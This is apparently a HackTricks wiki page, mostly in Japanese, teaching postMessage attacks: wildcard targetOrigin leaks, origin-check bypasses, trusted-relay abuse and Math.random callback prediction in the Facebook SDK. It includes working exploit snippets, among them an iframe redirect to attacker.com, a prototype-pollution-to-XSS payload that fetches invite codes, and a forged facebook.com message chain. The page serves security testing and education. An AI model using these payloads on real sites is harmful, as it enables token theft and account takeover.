# PostMessage 脆弱性

{{#include ../../banners/hacktricks-training.md}}

## **PostMessage** の送信

**PostMessage** はメッセージを送信するために次の関数を使用します:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
注意: **targetOrigin** は '\*' または _https://company.com._ のような URL になり得ます。\
In the **second scenario**, the **message can only be sent to that domain**（たとえ Window オブジェクトの origin が異なっていても）。\
If the **wildcard** is used, **messages could be sent to any domain**, and will be sent to the origin of the Window object.

### iframe と wildcard を狙った **targetOrigin** の攻撃

As explained in [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), `X-Frame-Header` 保護がなく **iframed** 可能なページを見つけ、かつ **postMessage** を使って **wildcard** (\*) により **sending sensitive** message を送信している場合、**iframe** の **origin** を **modify** して、あなたが制御するドメインにその **sensitive** message を **leak** させることができます。\
Note that if the page can be iframed but the **targetOrigin** is **set to a URL and not to a wildcard**, this **trick won't work**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** は、JS が **`postMessages` を受け取ることを期待している** 関数を宣言するために使用される関数です。\
以下のようなコードが使用されます:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note in this case how the **first thing** that the code is doing is **checking the origin**. This is terribly **important** mainly if the page is going to do **anything sensitive** with the received information (like changing a password). **If it doesn't check the origin, attackers can make victims send arbitrary data to this endpoints** and change the victims passwords (in this example).

### 列挙

現在のページで event listeners を見つけるには次の方法があります:

- JSコード内で `window.addEventListener` と `$(window).on` を **検索** する（_JQuery version_）
- 開発者ツールのコンソールで **実行**: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- ブラウザの開発者ツールで _Elements --> Event Listeners_ を **開く**

![](<../../images/image (396).png>)

- [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) や [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker) のような **browser extension** を使う。これらの拡張はすべてのメッセージを傍受して表示します。

### Origin チェックのバイパス

- `event.isTrusted` 属性は、本物のユーザー操作によって生成されたイベントに対してのみ `True` を返すためセキュアと見なされます。正しく実装されていればバイパスは難しいですが、セキュリティチェックでの重要性は高いです。
- `postMessage` イベントで origin 検証に `indexOf()` を使うとバイパスされやすい可能性があります。脆弱性の例は次の通り:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- `String.prototype.search()` の `search()` メソッドは正規表現用であり、文字列用ではありません。regexp 以外を渡すと暗黙的に正規表現に変換され、メソッドが潜在的に不安全になります。正規表現ではドット (.) がワイルドカードとして機能するため、細工したドメインで検証をバイパスできる可能性があります。例えば:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- `match()` 関数も `search()` と同様に正規表現を扱います。正規表現が不適切に構築されているとバイパスされる可能性があります。
- `escapeHtml` 関数は文字をエスケープして入力をサニタイズする目的で使われます。しかし、新しいエスケープ済みオブジェクトを作るのではなく既存オブジェクトのプロパティを上書きします。この挙動は悪用可能です。特に、オブジェクトを操作してコントロールされたプロパティが `hasOwnProperty` を認識しないようにできると、`escapeHtml` は期待通りに動作しません。以下の例で示します:

- 期待される失敗:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- エスケープのバイパス:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

この脆弱性の文脈では、`File` オブジェクトは read-only な `name` プロパティのため特に悪用されやすいです。このプロパティがテンプレートで使われると `escapeHtml` によってサニタイズされず、潜在的なセキュリティリスクを招きます。

- JavaScript の `document.domain` プロパティはスクリプトで設定してドメインを短縮でき、同一の親ドメイン内で same-origin policy の適用を緩めることができます。

### Origin-only trust + trusted relays

受信側が **`event.origin` のみ** をチェックする（例: `*.trusted.com` をすべて信頼する）場合、そのオリジン上に攻撃者制御のパラメータを受け取り `postMessage` で指定された `targetOrigin`/`targetWindow` に反映する（echo する）「リレー」ページが見つかることがよくあります。例としては、クエリパラメータを受け取り `{msg_type, access_token, ...}` を `opener`/`parent` に転送するマーケティング/分析用ガジェットなどがあります。可能な手順は次のとおり:

- `opener` を持つ popup/iframe で被害者ページを開き、ハンドラが登録されるようにする（多くのピクセル/SDKは `window.opener` が存在するときのみリスナーを付ける）。
- 別の攻撃者ウィンドウを trusted origin 上のリレーエンドポイントに移動させ、注入したいメッセージフィールド（message type、tokens、nonces）を埋める。
- メッセージが trusted origin から来るため、origin のみの検証は通過し、被害者のリスナーで特権的な動作（状態変更、API 呼び出し、DOM 書き込み）を引き起こせます。

実際に見られた悪用パターン:

- Analytics SDK（例: pixel/fbevents スタイル）は `FACEBOOK_IWL_BOOTSTRAP` のようなメッセージを受け取り、メッセージで渡されたトークンを使ってバックエンドAPIを呼び出し、リクエストボディに `location.href` / `document.referrer` を含めます。自分のトークンを渡せば、そのトークンのリクエスト履歴/ログからこれらのリクエストを読み取り、被害者ページの URL/referrer に含まれる OAuth コード/トークン を漏洩させることができます。
- 任意のフィールドを `postMessage` に反映するリレーは、特権リスナーが期待するメッセージタイプを偽装（spoof）させます。入力検証が弱いと組み合わせることで Graph/REST 呼び出し、機能の解除、または CSRF 相当のフローに到達できます。

探索のコツ: `event.origin` のみをチェックする `postMessage` リスナーを列挙し、URL パラメータを `postMessage` で転送する same-origin の HTML/JS エンドポイント（マーケティングプレビュー、ログインポップアップ、OAuth エラーページなど）を探します。`window.open()` と `postMessage` を組み合わせて origin チェックをバイパスします。

### e.origin == window.origin のバイパス

sandboxed iframe を使ってウェブページを埋め込む場合、iframe の origin が `null` に設定されることを理解しておくことが重要です。これは sandbox 属性とそのセキュリティや機能への影響に関して特に重要です。

sandbox 属性に **`allow-popups`** を指定すると、iframe 内から開かれたポップアップウィンドウは親の sandbox 制限を継承します。つまり、**`allow-popups-to-escape-sandbox`** 属性が含まれていない限り、ポップアップの origin も同様に `null` に設定され、iframe の origin と一致します。

結果として、これらの条件下でポップアップが開かれ、iframe からポップアップに **`postMessage`** でメッセージが送られると、送信側と受信側の origin は共に `null` に設定されます。そのため **`e.origin == window.origin`** は true（`null == null`）となり、iframe とポップアップが同じ origin 値 `null` を共有しているためこの比較は成立します。

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### e.source のバイパス

メッセージがスクリプトがリッスンしている同じウィンドウから来たかをチェックすることは可能です（特に **ブラウザ拡張の Content Scripts** がメッセージが同じページから送られたか確認する場合に有用です）:
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
メッセージの **`e.source`** を null に強制するには、**postMessage** を **送信する** **iframe** を作成し、それを **即座に削除** します。

詳細は **参照:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

これらの攻撃を行うには理想的には **put the victim web page** を `iframe` 内に配置できる必要があります。しかし、`X-Frame-Header` のようなヘッダーがその **挙動** を **防ぐ** ことがあります。\
そのような場合でも、より目立つ攻撃を使うことができます。脆弱なウェブアプリケーションを新しいタブで開き、そこから通信することができます：
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Stealing message sent to child by blocking the main page

以下のページでは、データが送信される前に**blocking**した**main**ページのために**child iframe**に送られる**sensitive postmessage data**を盗み、子側の**XSS in the child**を悪用してそれが受信される前に**leak the data**する方法を確認できます：

{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Stealing message by modifying iframe location

X-Frame-Header がない別の iframe を含むウェブページを iframe にできる場合、**change the location of that child iframe** が可能です。もしその子が **postmessage** を **wildcard** を使って受信しているなら、攻撃者はその iframe の **origin** を自身が **controlled** するページに **change** してメッセージを **steal** できます：

{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage to Prototype Pollution and/or XSS

`postMessage` を通じて送信されたデータが JS によって実行されるシナリオでは、対象の **page** を **iframe** にして、`postMessage` 経由でエクスプロイトを送ることで **prototype pollution/XSS** を **exploit** できます。

`postMessage` を通じた XSS について非常に詳しく説明された例は次にあります: [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Example of an exploit to abuse **Prototype Pollution and then XSS** through a `postMessage` to an `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
**詳細情報**:

- [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html) に関するページへのリンク
- [**XSS**](../xss-cross-site-scripting/index.html) に関するページへのリンク
- [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss) に関するページへのリンク

### postMessage ブリッジにおける **`Math.random()`** コールバックトークンの予測

メッセージ検証が `Math.random()` で生成された「共有シークレット」を使う場合（例: `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`）かつ同じヘルパーがプラグイン iframe の名前付けにも使われていると、PRNG 出力を回復して信頼済みメッセージを偽造できます:

- **window.name 経由での PRNG 出力の漏洩:** SDK はプラグイン iframe を `guid()` で自動命名します。トップフレームを制御できるなら、被害ページを iframe として読み込み、プラグイン iframe を自分のオリジンに遷移させ（例: `window.frames[0].frames[0].location='https://attacker.com'`）、`window.frames[0].frames[0].name` を読めば生の `Math.random()` 出力を取得できます。
- **リロードなしでさらに出力を得る:** 一部の SDK は再初期化パスを公開しています。FB SDK では `init:post` に `{xfbml:1}` を送ると `XFBML.parse()` が強制実行され、プラグイン iframe を破棄・再作成して新しい名前／コールバック ID を生成します。再初期化を繰り返せば必要なだけ PRNG 出力を得られます（ただしコールバック／iframe ID 用の内部 `Math.random()` 呼び出しが挟まるため、中間の値はスキップする必要があります）。
- **parameter pollution を使った trusted-origin 配信:** ファーストパーティのプラグインエンドポイントがクロスウィンドウペイロードに未サニタイズのパラメータを反映するなら（例: `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`）、trusted な `facebook.com` オリジンを保ったまま `&type=...&iconSVG=...` を注入できます。
- **次のコールバックを予測する:** 漏えいした iframe 名を `[0,1)` の浮動小数点に戻し、いくつかの値（連続していなくても可）を V8 用の `Math.random` 予測器（例: Z3 ベース）に入力します。ローカルで次の `guid()` を生成すれば期待されるコールバックトークンを偽造できます。
- **sink をトリガーする:** postMessage データを適切に作成してブリッジに `xd.mpn.setupIconIframe` を dispatch させ、`iconSVG` に HTML（例: URL エンコードした `<img src=x onerror=...>`）を注入すると、ホスト側オリジン内で DOM XSS を達成できます。そこから same-origin の iframe（OAuth ダイアログ、arbiter など）を読み取れます。
- **フレーミングの細かい挙動が有利に働くことがある:** このチェーンはフレーミングを必要とします。モバイル webview の一部では、`frame-ancestors` が存在すると `X-Frame-Options` が未サポートの `ALLOW-FROM` に退化する場合があり、「compat」パラメータが寛容な `frame-ancestors` を強制して `window.name` サイドチャネルを有効にすることがあります。

#### 最小の偽造メッセージ例
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## 参考資料

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- 練習用: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
